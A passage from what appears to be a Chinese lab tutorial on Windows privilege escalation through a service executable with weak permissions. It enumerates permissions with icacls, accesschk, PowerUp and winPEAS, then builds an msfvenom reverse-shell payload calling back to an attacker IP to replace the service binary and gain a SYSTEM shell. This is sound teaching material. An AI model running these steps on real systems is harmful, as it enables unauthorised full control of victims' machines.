<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">icacls &quot;C:\Program Files\Juggernaut\Juggernaut.exe&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745342-1808915990-c811cdacd87b1b64fc2b0b29d7ae5125.png" width="945" height="160" class="img_ev3q"></p>
<p>Perfect！这意味着我们可以用恶意程序替换服务启动程序，从而完全控制这项服务。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举服务的弱权限文件--accesschk"><strong><div id="id2.2">2.2、枚举服务的弱权限文件 – Accesschk</div></strong><a href="#22枚举服务的弱权限文件--accesschk" class="hash-link" aria-label="22枚举服务的弱权限文件--accesschk的直接链接" title="22枚举服务的弱权限文件--accesschk的直接链接">​</a></h4>
<p>一旦找到了感兴趣的服务，我们也可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener noreferrer">Sysinternals</a> 工具套件中名为 Accesschk 的工具来枚举目录和文件的权限，它与 icacls 命令非常相似。</p>
<p>在向受害者机器传输任何工具之前，我们需要先枚举其架构，然后再为其传输匹配的工具。命令如下：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745201-889902224-d1a4d48b7a2a43a1f76b55a4b2d9b76e.png" width="992" height="137" class="img_ev3q"></p>
<p>可以看到，这台机器运行的是 Windows 10 Pro - Build 18362 - Version 1903，并且是 x64 架构。</p>
<p>然后，我们就可以使用 certutil 工具去传输64位的 accesschk64.exe 程序了。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121744764-372150494-2732b3001d918827f2cd6d29923e85e6.png" width="609" height="332" class="img_ev3q"></p>
<p>先使用以下命令查看目录的权限：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe -wvud &quot;C:\Program Files\Juggernaut&quot; -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745451-594648805-23b71974827400870cd78e1c40bda99d.png" width="610" height="296" class="img_ev3q"></p>
<p>在这里，我们可以看到 BUILTIN\Users 组拥有 FILE_ALL_ACCESS，即“完全控制”权限，这与 icacls 输出的结果非常相似。</p>
<p>然后我们去掉“-d”选项，去检查服务启动程序的权限，例如：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.\accesschk64.exe -wvu &quot;C:\Program Files\Juggernaut\Juggernaut.exe&quot; -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745295-1190999363-9d1f9fb5aff102826abc58df4e89e53d.png" width="721" height="266" class="img_ev3q"></p>
<p>可以看到， BUILTIN\Users 组同样拥有 FILE_ALL_ACCESS 权限。</p>
<p>现在，既然我们已经了解了如何使用手动技术来枚举权限薄弱的目录，那么接下来就看看如何使用自动工具一次性枚举所有<strong>非标准服务</strong>和<strong>权限薄弱的服务文件</strong>。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3工具自动化搜寻弱服务"><strong><div id="id3">3、工具自动化搜寻弱服务</div></strong><a href="#3工具自动化搜寻弱服务" class="hash-link" aria-label="3工具自动化搜寻弱服务的直接链接" title="3工具自动化搜寻弱服务的直接链接">​</a></h2>
<p>从上面，我们已经了解了如何通过 wmic 查找非标准服务，以及如何使用 icacls 和 accesschk 枚举非标准服务启动程序所在目录的权限。接下来，我们将学习如何借助工具来同时完成这两个步骤。</p>
<p>有很多后利用工具和脚本可使用，但在本例中，我们将坚持使用 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener noreferrer">PowerUp.ps1</a> 和 <a href="https://github.com/carlospolop/PEASS-ng/" target="_blank" rel="noopener noreferrer">winPEASx64.exe</a>。</p>
<p>在下载每个工具的副本之后，我们将其转移到受害者机器。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745461-1096076305-4e6a2337d90525a70c4cfb70949e271a.png" width="461" height="252" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31powerup"><strong><div id="id3.1">3.1、PowerUp</div></strong><a href="#31powerup" class="hash-link" aria-label="31powerup的直接链接" title="31powerup的直接链接">​</a></h4>
<p>在这个示例中，我们先使用 PowerUp，然后再使用 winPEAS。</p>
<blockquote>
<p>一般在手动枚举之后，我们希望优先使用 PowerUp，因为它输出的<strong>内容精炼且有效</strong>可能会为我们更快取得胜利。当使用 PowerUp 检查完毕且没有找到可利用信息之后，我们再使用 winPEAS 对系统进行全面枚举。</p>
</blockquote>
<p>可以使用命令 <code>powershell -ep bypass</code> 进入 PowerShell，然后再使用点源的方式（. .\scrip.ps1）将 PowerUp.ps1 加载到当前会话中。</p>
<p>然后，就可以使用 PowerUp 的 Invoke-AllChecks 功能一次检查所有错误配置和漏洞，就像这样：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">. .\PowerUp.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-AllChecks</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745450-341336065-7b8200b234ce43f2737f2c173d0aa7dd.png" width="615" height="379" class="img_ev3q"></p>
<p>PowerUp 查找了服务的弱权限文件，并发现了较弱的 Juggernaut 服务。</p>
<p>此外，PowerUp.ps1 还内置了其它函数，可用于滥用 PowerUp 发现的大多数错误配置或特殊权限。【注：滥用操作在本文的<a href="#id5">第 5 节</a>讲述】</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32winpeas"><strong><div id="id3.2">3.2、winPEAS</div></strong><a href="#32winpeas" class="hash-link" aria-label="32winpeas的直接链接" title="32winpeas的直接链接">​</a></h4>
<p>接下来开始 winPEAS 工具的使用，winPEAS 会输出大量的信息让人很容易犯迷糊，因此避免迷糊的关键在于<strong>要清楚我们要找的信息所在的标识位置</strong>。对于弱服务权限，我们要检查“<strong>Services Information</strong>”部分。这里会为我们提供有关服务名称、服务启动程序路径和启动类型等信息。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745847-844393583-38b6eef2b48a210124709758fd055067.png" width="1008" height="344" class="img_ev3q"></p>
<p>这告诉了我们利用这项服务所需的一切信息。它显示我们拥有可执行文件的写入权限，而且该程序还是一个自动启动程序。</p>
<p>由于这是一个弱服务漏洞，winPEAS 实际上也在“<strong>Application Information</strong>”部分提示了该漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745909-1048296581-e8ddbc47fb5dc6fa3f40ed273d7ac9b6.png" width="1005" height="503" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用服务的弱权限文件"><strong><div id="id4">4、利用服务的弱权限文件</div></strong><a href="#4利用服务的弱权限文件" class="hash-link" aria-label="4利用服务的弱权限文件的直接链接" title="4利用服务的弱权限文件的直接链接">​</a></h2>
<p>现在，我们已经看到了寻找非标准服务和枚举服务文件权限的多种方法，接下来要做的就是利用服务获取 SYSTEM shell。</p>
<p>而要利用这一点，我们需要制作一个与服务启动程序名称相同的恶意程序 Juggernaut.exe。同时我们知道该系统架构是 64 位，因此可以使用以下命令轻松制作出恶意程序：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=172.16.1.30 -a x64 --platform Windows -f exe -o Juggernaut.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745246-1016945577-536aaa8b02c2eb6185f8c99756e60f64.png" width="1019" height="111" class="img_ev3q"></p>
<blockquote>
<p>如果发现该服务是在 Program Files (x86) 目录中运行的，则需要考虑制作一个 32 位的可执行文件，因为 64 位的可执行文件对该服务可能不起作用。</p>
</blockquote>
<p>有了恶意程序之后，将其转移到受害者机器。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745728-1045381510-a54dde44af41301c1885a91d0ef8e5eb.png" width="544" height="230" class="img_ev3q"></p>
<p>在在受害者机器上将文件移动到 <code>C:\Program Files\Juggernaut</code> 目录之前，我们需要备份原来的服务启动程序。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">move &quot;C:\Program Files\Juggernaut\Juggernaut.exe&quot; &quot;C:\Program Files\Juggernaut\Juggernaut.exe.BAK&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250314121745149-693630495-106bf9b3306ae5165882c6ba4d86fe5f.png" width="909" height="326" class="img_ev3q"></p>
<p>备份完成之后，就可以启动 netcat 监听，迁移恶意程序，然后重启系统。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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